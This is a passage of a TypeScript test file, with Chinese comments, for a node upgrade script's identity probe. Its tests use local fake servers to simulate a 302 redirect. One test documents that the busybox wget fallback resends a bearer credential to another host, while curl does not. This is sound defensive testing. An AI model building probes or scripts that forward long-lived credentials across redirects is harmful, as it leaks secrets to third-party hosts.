  path: string;
  auth: string | null;
}

/**
 * 记录型端点：可以扮演"原 Panel"或"跳转目标"。
 *
 * 区分"发到原 host 的 302"与"发到跳转目标的请求"靠的是**两个不同的 host 地址**
 * （`127.0.0.1` vs `127.0.0.2`，各自一个 server、各自一份记录），而不是靠路径或
 * 时间推断 —— 两边记录到什么，就是网络上真实发生过什么。
 */
function startRecordingEndpoint(hostname: string, respond?: () => Response) {
  const seen: SeenProbeRequest[] = [];
  const server = Bun.serve({
    hostname,
    port: 0,
    fetch(req) {
      seen.push({ path: new URL(req.url).pathname, auth: req.headers.get("authorization") });
      return respond ? respond() : Response.json({ data: { snapshot: null } });
    },
  });
  return { server, seen, url: `http://${hostname}:${server.port}` };
}

describe("凭据外发：302 跳向另一台 host", () => {
  const body = probeBody(render().script);

  test("curl 分支（标准镜像）：凭据只发给原地址，跳转目标一个请求都收不到", async () => {
    const box = probeSandbox(["curl", "grep", "head", "mktemp", "rm"]);
    const target = startRecordingEndpoint("127.0.0.2");
    const panel = startRecordingEndpoint(
      "127.0.0.1",
      () => new Response("<html>moved</html>", { status: 302, headers: { location: `${target.url}/api/internal/node/snapshot` } }),
    );
    try {
      const answer = await runProbe(body, panel.url, box.bin, box.envFile);
      expect(answer).toBe("http:302"); // 结论：未校验（不谎报）
      // 原地址确实收到了带凭据的请求（否则这条校验没有意义）。
      expect(panel.seen).toHaveLength(1);
      expect(panel.seen[0]!.auth).toBe("Bearer probe-test-credential");
      // ★ 关键断言：跳转目标收到了**零**请求 —— 凭据没有出容器。
      expect(target.seen).toEqual([]);
    } finally {
      panel.server.stop(true);
      target.server.stop(true);
      rmSync(box.dir, { recursive: true, force: true });
    }
  }, 30_000);

  test("wget 兜底（没有 curl 的镜像）：结论正确，但凭据确实被重发到了另一台 host", async () => {
    // 这条用例**故意钉住残留**：busybox wget 无法禁止跟随重定向，`--header` 会随跳转发出去。
    // 它不是"应该发生"的行为，而是"必须装 curl"的证据 —— 如果哪天有人删掉 Dockerfile 里的
    // curl，生产镜像就会退回到这个形状（结论仍然正确，凭据却外发了）。
    const box = probeSandbox(["wget", "grep", "head", "mktemp", "rm"]);
    const target = startRecordingEndpoint("127.0.0.2");
    const panel = startRecordingEndpoint(
      "127.0.0.1",
      () => new Response("<html>moved</html>", { status: 302, headers: { location: `${target.url}/api/internal/node/snapshot` } }),
    );
    try {
      const answer = await runProbe(body, panel.url, box.bin, box.envFile);
      expect(answer).toBe("http:302"); // 结论仍然正确
      expect(target.seen.length).toBeGreaterThan(0); // 但请求真的到了另一台 host
      expect(target.seen[0]!.auth).toBe("Bearer probe-test-credential"); // 而且带着长期凭据
    } finally {
      panel.server.stop(true);
      target.server.stop(true);
      rmSync(box.dir, { recursive: true, force: true });
    }
  }, 30_000);
});

/* ------------------------------------------------------------------ */
/* 首选路径：agent 内置探针（task-29）                                    */
/* ------------------------------------------------------------------ */

describe("身份探针的首选路径与兜底路径", () => {
  const body = probeBody(render().script);

  test("镜像里有内置探针 ⇒ 用它，并把四个参数原样交出去", async () => {
    const box = probeSandbox(["curl", "grep", "head", "mktemp", "rm", "jq"], 'echo "$@" >> "$AGENT_ARGS_FILE"; echo "http:200:agent"');
    const panel = startFakePanel("ok");
    try {
      const base = `http://127.0.0.1:${panel.port}`;
      // 假二进制把收到的参数写到文件里：这样断言的是**真实传参**，不是脚本文本。
      const argsFile = join(box.dir, "agent-args.txt");
      const proc = Bun.spawn([SH, "-c", body, "sh", base, "5", box.envFile], {
        env: { PATH: box.bin, AGENT_ARGS_FILE: argsFile },
        stdout: "pipe",
        stderr: "pipe",
      });
      const out = (await new Response(proc.stdout).text()).trim();
      await proc.exited;
      expect(out).toBe("http:200:agent");
      const args = readFileSync(argsFile, "utf8").trim().split(" ");
      expect(args).toContain("--identity-probe");
      expect(args).toContain("--probe-url");
      expect(args).toContain(base);
      expect(args).toContain("--probe-timeout");
      expect(args).toContain("5");
      expect(args).toContain("--probe-env-file");
      expect(args).toContain(box.envFile);
      // 内置探针已经给了结论 ⇒ 兜底路径不该再发一次请求（面板只被**探针**打过一次，
      // 而这次探针是假的、没打请求 ⇒ 面板应当**零请求**）。
      expect(panel.seenCount).toBe(0);
    } finally {
      panel.stop(true);
      rmSync(box.dir, { recursive: true, force: true });
    }
  }, 30_000);

  test("内置探针判未校验 ⇒ 原样透传，绝不去兜底路径碰运气", async () => {
    const box = probeSandbox(["curl", "grep", "head", "mktemp", "rm", "jq"], 'echo "unverified:not_panel_json"');
    const panel = startFakePanel("ok");
    try {
      expect(await runProbe(body, `http://127.0.0.1:${panel.port}`, box.bin, box.envFile)).toBe("unverified:not_panel_json");
      expect(panel.seenCount).toBe(0);
    } finally {
      panel.stop(true);
      rmSync(box.dir, { recursive: true, force: true });
    }
  }, 30_000);

  test("老镜像的二进制不认识该标志（吐 usage、退出 2）⇒ 落到 shell 兜底路径", async () => {
    const box = probeSandbox(["curl", "grep", "head", "mktemp", "rm", "jq"], 'echo "Usage: tunex-agent [flags]"; exit 2');
    const panel = startFakePanel("ok");
    try {
      // 兜底路径会真的用 curl 打一次 ⇒ 结论是 `http:200:jq`（而不是把 usage 当结论）。
      expect(await runProbe(body, `http://127.0.0.1:${panel.port}`, box.bin, box.envFile)).toBe("http:200:jq");
      expect(panel.seenCount).toBe(1);
    } finally {
      panel.stop(true);
      rmSync(box.dir, { recursive: true, force: true });
    }
  }, 30_000);

  test("没有内置探针 ⇒ 兜底路径（curl/jq），结论带 :jq 标记", async () => {
    const box = probeSandbox(["curl", "grep", "head", "mktemp", "rm", "jq"]);
    const panel = startFakePanel("ok");
    try {
      expect(await runProbe(body, `http://127.0.0.1:${panel.port}`, box.bin, box.envFile)).toBe("http:200:jq");
    } finally {
      panel.stop(true);
      rmSync(box.dir, { recursive: true, force: true });
    }
  }, 30_000);
});

/**
 * 回归：**渲染出来的脚本必须能被 POSIX shell 解析**。
 *
 * 为什么单独立一条：本文件里其它用例都是**字符串断言**（"脚本里有这一步/这句话"），
 * 而"引号不配平"这种错误会让断言全绿、脚本却 `sh` 直接拒跑。真实缺陷（L56 实测）：
 * 探针块本身用**单引号**包裹（`docker exec … sh -c '…'`），块内又出现
 * `jq -e 'type=="object"…'` ⇒ 内层单引号**提前终结**外层引号，`(.data|…)` 的 `(` 暴露成
 * 未加引号的 token ⇒ `bash -n` / `dash -n` 双双 rc=2、**任何节点都无法升级**，而且现场
 * 是在"已经停掉旧容器"之后才炸，节点会停在无 agent 的状态。
 *
 * 所以：**先跑 `sh -n`，再断言里面有它该有的东西**。字节数门槛是为了防止
 * "渲染函数返回空串 ⇒ 对空文件做语法检查 ⇒ 假绿"（这个假阳性我自己踩过一次）。
 */
describe("升级脚本必须是合法 POSIX sh（render → sh -n）", () => {
  const facts = {
    node_key: "REG-SYNTAX-NODE",
    container_name: "tunex-agent",
    current_image: "tunex-harvest-agent:cafaaba",
  } as never;

  test("渲染结果非空，且 bash/dash 的 -n 都通过（含引号不配平回归）", () => {
    const rendered = renderNodeUpgradeScript(facts, "registry.example.com/tunex-agent:0.15.0", {
      panelURL: "http://panel.example.com",
      containerName: "tunex-agent",
    });
    const script = rendered.script;

    // 1) 非空门槛（防止对空文件做语法检查得到假绿）
    expect(script.length).toBeGreaterThan(500);

    // 2) 真正跑语法检查（两条解释器都跑：脚本声明 #!/bin/sh，而 Ubuntu 的 sh 是 dash）
    const dir = mkdtempSync(join(tmpdir(), "tunex-upgrade-syntax-"));
    const file = join(dir, "upgrade.sh");
    writeFileSync(file, script, { mode: 0o644 });
    try {
      for (const shell of ["sh", "bash", "dash"]) {
        const proc = Bun.spawnSync([shell, "-n", file], { stdout: "pipe", stderr: "pipe" });
        const stderr = new TextDecoder().decode(proc.stderr);
        expect(`${shell} rc=${proc.exitCode} ${stderr.trim()}`).toBe(`${shell} rc=0 `);
      }
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }

    // 3) 内层单引号必须被正确转义（写成 `'\''`），否则上面的 -n 就会红；
    //    这里把"该转义"这件事钉成显式断言，失败信息更可读。
    expect(script).toContain(String.raw`'\''type=="object" and (.data|type=="object")'\''`);
  }, 20_000);
});
